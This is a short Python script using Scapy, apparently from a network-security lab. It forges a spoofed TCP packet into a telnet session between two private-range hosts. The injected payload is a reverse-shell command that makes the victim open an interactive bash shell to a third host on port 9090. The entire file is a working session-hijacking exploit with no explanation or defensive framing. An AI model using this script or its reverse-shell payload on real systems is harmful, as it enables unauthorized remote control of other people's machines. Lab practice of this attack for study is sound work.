#!/usr/bin/env python3
from scapy.all import*
ip = IP(src="10.9.0.6",dst="10.9.0.5")
tcp = TCP(sport=47820,dport=23,flags="A",seq=1508446394,ack=2082502540)
data="/bin/bash -i > /dev/tcp/10.9.0.7/9090 0<&1 2>&1\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)

